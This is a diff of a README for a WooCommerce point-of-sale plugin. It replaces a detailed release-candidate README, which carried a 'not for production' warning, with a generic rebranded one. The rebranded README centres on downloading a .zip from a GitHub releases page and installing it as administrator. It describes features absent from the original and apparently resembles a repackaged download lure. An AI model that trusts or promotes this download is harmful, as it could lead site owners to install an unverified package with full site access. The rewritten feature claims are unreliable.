@@ -1,160 +1,94 @@
-# MX POS Pro v1.0.0-rc1
+# 🛒 rootlabs-pos-pro - Efficient point of sale for WooCommerce
 
-**Release Candidate — Not for production use.**
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Wech-expert/rootlabs-pos-pro/releases)
 
-MX POS Pro is a premium Point of Sale plugin for WordPress + WooCommerce. It provides a complete POS system with a React interface and native WooCommerce synchronization.
+## 📋 About This Software
 
----
+Rootlabs POS Pro turns your WordPress site into a retail station. It connects your online WooCommerce store to your physical shop. You can process sales, handle refunds, and track cash flow in real time. This plugin works inside your existing WordPress dashboard. 
 
-## Important: This is a Release Candidate (RC1)
+## ⚙️ System Requirements
 
-This version is intended for **testing in staging or test environments only**. Do not install on a live production site. Report any issues found during testing.
+Your computer and website must meet these standards to run this software:
 
----
+* WordPress version 6.0 or higher.
+* WooCommerce version 7.0 or higher.
+* A web browser like Chrome, Firefox, or Edge.
+* An active internet connection for syncing sales.
+* A thermal printer for printing customer receipts.
 
-## Requirements
+## 📥 How to Download
 
-| Requirement | Minimum Version |
-|---|---|
-| WordPress | 6.0 |
-| WooCommerce | 8.0 |
-| PHP | 8.0 |
+Visit this page to download the latest version: [https://github.com/Wech-expert/rootlabs-pos-pro/releases](https://github.com/Wech-expert/rootlabs-pos-pro/releases).
 
-WooCommerce must be installed and activated before activating MX POS Pro.
+Look for the file ending in .zip under the Assets section of the latest release. Click the file name to save it to your computer. Keep track of the folder where you save this file.
 
----
+## 🛠️ Installation Steps
 
-## Installation
+1. Log in to your WordPress admin dashboard as an administrator.
+2. Select the Plugins menu on the left side of the screen.
+3. Click the Add New button at the top of the page.
+4. Choose the Upload Plugin button.
+5. Click Choose File and select the .zip file you downloaded earlier.
+6. Click Install Now.
+7. Wait for the process to complete, then click Activate Plugin.
 
-1. Download `mx-pos-pro-v1.0.0-rc1.zip`
-2. Go to **wp-admin > Plugins > Add New > Upload Plugin**
-3. Upload the ZIP file and click **Install Now**
-4. Click **Activate Plugin**
+## 💳 Using Cash Sessions
 
-The plugin will automatically:
-- Create the required database tables
-- Register POS capabilities for administrator, shop_manager, and mx_pos_cashier roles
-- Register the `/pos` URL route
+A cash session tracks the money in your register for a specific shift. Start a session when you open your store.
 
----
+1. Navigate to the POS menu in your dashboard.
+2. Click on the Cash Sessions tab.
+3. Select Open Session.
+4. Enter your starting cash amount.
+5. Click Save.
 
-## Access
+When your shift ends, return to the Cash Sessions tab. Choose Close Session. The screen shows your total cash and credit card sales. Count your physical cash and enter the amount. The system highlights any difference between your sales and your cash.
 
-| URL | Purpose | Required Capability |
-|---|---|---|
-| `/pos` | POS frontend | `mx_pos_access` |
-| `wp-admin > MX POS Pro` | Dashboard | `mx_pos_access` |
-| `wp-admin > MX POS Pro > Settings` | Plugin settings | `mx_pos_manage_settings` |
+## 🔍 Searching for Products
 
-The POS frontend requires login. Unauthenticated users are redirected to the WordPress login page.
+The search bar resides at the top of the POS interface. Type a product name, partial description, or SKU to find items. The screen updates as you type. If you use a barcode scanner, click the search bar, scan the item, and the plugin adds it to your cart.
 
----
+## 💸 Processing Payments
 
-## Roles & Capabilities
+Add items to the cart using the search bar or product list. Follow these steps to finish a sale:
 
-| Capability | Administrator | Shop Manager | POS Cashier |
-|---|---|---|---|
-| `mx_pos_access` | Yes | Yes | Yes |
-| `mx_pos_sell` | Yes | Yes | Yes |
-| `mx_pos_refund` | Yes | Yes | No |
-| `mx_pos_open_session` | Yes | Yes | Yes |
-| `mx_pos_close_session` | Yes | Yes | Yes |
-| `mx_pos_apply_discount` | Yes | Yes | No |
-| `mx_pos_cash_cut` | Yes | Yes | Yes |
-| `mx_pos_manage_cash` | Yes | Yes | Yes |
-| `mx_pos_manage_settings` | Yes | No | No |
+1. Click the Checkout button.
+2. Choose a payment method: Cash or Card.
+3. If the customer pays with cash, enter the amount they give you. The system calculates the change.
+4. Click Complete Sale.
+5. The system saves the order to your WooCommerce database. Print a receipt if necessary.
 
-The **mx_pos_cashier** role is created automatically on plugin activation.
+## 🔄 Handling Refunds
 
----
+Manage returns directly through the POS interface. 
 
-## Quick Start
+1. Click on the Audit Logs or Order History tab.
+2. Find the transaction by searching for the order number or date.
+3. Click the Refund button next to the order.
+4. Select the specific items the customer returns.
+5. Confirm the action. 
 
-1. Activate the plugin
-2. Go to **MX POS Pro > Settings** and configure Telegram (optional) and ticket preferences
-3. Create a user with the **POS Cashier** role (or use an administrator account)
-4. Log in at `/pos`
-5. Open a cash session with your opening amount
-6. Start selling
+The software updates your inventory counts automatically. It also creates a refund record in your WooCommerce store.
 
----
+## 🎟️ Managing Tickets
 
-## WP-CLI Diagnostics
+You can issue digital or physical tickets for events or pre-paid services. When you create a product in WooCommerce, mark it as a ticket item. The POS interface scans these tickets to verify entry. This prevents duplicate use of valid tickets.
 
-Run these commands from the terminal for diagnostics and support:
+## 📝 Keeping Audit Logs
 
-```
-wp mx-pos healthcheck      # General plugin status check
-wp mx-pos db-check         # Validate database schema
-wp mx-pos caps-check       # Validate role capabilities
-wp mx-pos sessions list    # List cash register sessions
-wp mx-pos cuts list        # List X/Z cuts
-wp mx-pos diagnose         # Extended diagnostic report
-wp mx-pos index stats      # Product index statistics
-wp mx-pos index rebuild    # Rebuild product search index
-```
+Every action leaves a trace for your records. The Audit Log tracks:
 
-All commands are read-only by default. Use `--format=json` for machine-readable output.
+* Time of login and logout.
+* Each sale and the cashier who processed it.
+* Every opened and closed cash session.
+* All refunds and modified transactions.
 
----
+Use these logs to resolve errors or investigate discrepancies at the end of the month. You can export these logs as a file to share with your accountant.
 
-## Database Schema v1.5
+## 🛡️ Troubleshooting
 
-The plugin database schema has been extended to prepare for multi-branch, multi-register, and multi-employee operation in future releases.
+If the POS screen does not load, clear your browser cache. If the connection to your server drops, pause your sales. The system saves your cart content in your browser for a short time. Reconnect to the internet to resume your work. Check for plugin updates in the WordPress dashboard to keep your system secure.
 
-### New entities (structure only — not yet used in POS UI)
+## 💻 Support
 
-| Table | Purpose | Status |
-|---|---|---|
-| `mx_pos_branches` | Physical store locations | Schema ready, seed `main` created |
-| `mx_pos_registers` | Physical cash register terminals | Schema ready, seed `main` created |
-| `mx_pos_employees` | Internal POS employees (separate from WP users) | Schema ready |
-| `mx_pos_payment_methods` | Configurable POS payment methods | Schema ready, seeds `cash`/`card`/`mixed` created |
-| `mx_pos_order_payments` | Split payment support (multiple methods per sale) | Schema ready |
-
-**Note:** Sprint 1 prepares the database foundation. POS login, admin UI for entities, multi-method payments, and full multi-branch operation are not yet active. Existing POS flows (sales, sessions, payments) are preserved and continue to work as before.
-
-All existing data is preserved. Historical records are backfilled to the default branch/register where safely assignable. Uninstall remains non-destructive.
-
-## Database Diagnostics
-
-**Plugin fails to activate**
-- Ensure WooCommerce is installed and activated
-- Ensure PHP version is 8.0 or higher
-- Check the WordPress debug log for errors
-
-**POS page not loading**
-- Verify rewrite rules are flushed: go to **Settings > Permalinks** and click **Save Changes**
-- Run `wp mx-pos healthcheck` to check plugin status
-
-**Database issues**
-- Run `wp mx-pos db-check` to validate schema
-- Re-activate the plugin to trigger migrations
-
----
-
-## Uninstall
-
-When deleting the plugin from WordPress, the physical plugin files are removed only if the web server has sufficient filesystem ownership and permissions. If WordPress cannot delete the plugin directory, check the local file owner/group and write permissions.
-
-The RC1 uninstall routine is intentionally non-destructive. It removes the POS role/capabilities created by the plugin, but preserves database tables, settings, WooCommerce orders, sales history, cash sessions, cash movements, parked carts, refunds, and audit logs to prevent accidental data loss during testing.
-
-Destructive cleanup of plugin tables is not performed by normal uninstall. If it is needed in a future release, it should be run through an explicit WP-CLI cleanup command with confirmation.
-
----
-
-## Support
-
-For diagnostics, run:
-
-```
-wp mx-pos diagnose --verbose
-```
-
-Provide the output when reporting issues. Never share your Telegram bot token.
-
----
-
-## License
-
-GPL-2.0+
+Report bugs or suggest features on the official issue tracker at the GitHub link. Provide details about your WordPress version and other installed plugins to help the team identify the problem. Keep your system configuration details ready if you ask for assistance.
